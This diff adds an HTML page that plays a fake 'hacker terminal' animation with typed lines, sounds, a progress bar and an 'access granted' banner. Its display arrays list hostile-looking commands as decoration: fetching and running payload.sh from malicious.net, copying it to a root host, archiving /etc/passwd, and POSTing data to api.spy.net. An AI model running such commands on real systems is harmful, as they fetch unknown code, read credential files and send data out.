@@ -1,0 +1,167 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Hacker Terminal - Ayush</title>
+  <style>
+    body {
+      margin: 0;
+      background: black;
+      color: #00ff00;
+      font-family: 'Courier New', Courier, monospace;
+      font-size: 18px;
+      padding: 20px;
+    }
+    #terminal {
+      white-space: pre-wrap;
+      overflow-y: auto;
+      height: 100vh;
+    }
+    #access {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      background-color: black;
+      color: red;
+      font-size: 48px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      opacity: 0;
+      z-index: 10;
+    }
+    #progressBarContainer {
+      width: 100%;
+      height: 10px;
+      background: #222;
+      position: fixed;
+      bottom: 0;
+      left: 0;
+      z-index: 5;
+    }
+    #progressBar {
+      height: 100%;
+      width: 0%;
+      background: #00ff00;
+      transition: width 0.3s;
+    }
+    #progressText {
+      position: fixed;
+      bottom: 15px;
+      right: 20px;
+      color: #00ff00;
+      font-family: 'Courier New';
+      font-size: 16px;
+    }
+    @keyframes blink {
+      0% { opacity: 0; }
+      25% { opacity: 1; }
+      50% { opacity: 0; }
+      75% { opacity: 1; }
+      100% { opacity: 1; }
+    }
+    .error-line {
+      color: red;
+    }
+  </style>
+</head>
+<body>
+  <div id="terminal"></div>
+  <div id="access">FULL ACCESS GRANTED</div>
+  <div id="progressBarContainer"><div id="progressBar"></div></div>
+  <div id="progressText">0%</div>
+  <audio id="accessSound" src="https://assets.mixkit.co/sfx/preview/mixkit-arcade-retro-completion-alert-219.wav"></audio>
+  <audio id="typeSound" src="https://assets.mixkit.co/sfx/preview/mixkit-fast-typing-on-keyboard-2170.wav"></audio>
+
+  <script>
+    const terminal = document.getElementById('terminal');
+    const access = document.getElementById('access');
+    const accessSound = document.getElementById('accessSound');
+    const typeSound = document.getElementById('typeSound');
+    const progressBar = document.getElementById('progressBar');
+    const progressText = document.getElementById('progressText');
+
+    const introLines = [
+      "[+] Initializing secure access...",
+      "[+] Connecting to mainframe...",
+      "[+] Bypassing firewall...",
+      "[+] Injecting payload...",
+      "[+] Welcome, Dark Legend",
+      "[+] Access Granted",
+      ">>> Operation BLACKSHADOW started...",
+      ">>> Loading today's target..."
+    ];
+
+    const commands = [
+      "apt-get install -y exploit-db",
+      "wget https://malicious.net/payload.sh",
+      "chmod +x payload.sh",
+      "./payload.sh --stealth",
+      "nmap -sS -Pn 192.168.1.0/24",
+      "echo 'Trojan injected' >> /var/log/syslog",
+      "scp payload.sh root@10.0.0.1:/tmp/",
+      "tar -czvf backup.tar.gz /etc/passwd",
+      "openssl enc -aes-256-cbc -in secret.txt -out secret.enc",
+      "curl -X POST -d \"data=access_granted\" https://api.spy.net"
+    ];
+
+    const errors = [
+      "Permission denied while accessing /etc/shadow",
+      "Connection timed out to 10.0.0.1",
+      "Malformed packet detected... ignoring",
+      "Error: Unexpected end of archive",
+      "Warning: Unauthorized attempt detected"
+    ];
+
+    const fakeCodeLines = Array.from({ length: 200 }, (_, i) => {
+      if (i < 7 && Math.random() < 0.6) {
+        return `<span class='error-line'>[ERROR] ${errors[Math.floor(Math.random() * errors.length)]}</span>`;
+      }
+      return `[INFO] ${commands[Math.floor(Math.random() * commands.length)]} ... OK`;
+    });
+
+    const lines = [...introLines];
+    const loadingDelay = 1500;
+
+    let index = 0;
+    function typeLine() {
+      if (index < lines.length) {
+        terminal.innerHTML += lines[index] + "\n";
+        terminal.scrollTop = terminal.scrollHeight;
+        index++;
+        typeSound.play();
+        setTimeout(typeLine, 700);
+      } else {
+        terminal.innerHTML += "\n[+] Target data loaded. Initializing code stream...\n";
+        terminal.scrollTop = terminal.scrollHeight;
+        setTimeout(() => runFakeCode(), loadingDelay);
+      }
+    }
+
+    let fakeIndex = 0;
+    function runFakeCode() {
+      if (fakeIndex < fakeCodeLines.length) {
+        terminal.innerHTML += fakeCodeLines[fakeIndex] + "\n";
+        terminal.scrollTop = terminal.scrollHeight;
+        fakeIndex++;
+        const progressPercent = Math.floor((fakeIndex / fakeCodeLines.length) * 100);
+        progressBar.style.width = `${progressPercent}%`;
+        progressText.textContent = `${progressPercent}%`;
+        typeSound.play();
+        setTimeout(runFakeCode, 30);
+      } else {
+        progressBar.style.width = '100%';
+        progressText.textContent = '100%';
+        access.style.animation = "blink 2s ease-in-out 1 forwards";
+        access.style.opacity = 1;
+        accessSound.play();
+      }
+    }
+
+    window.onload = typeLine;
+  </script>
+</body>
+</html>
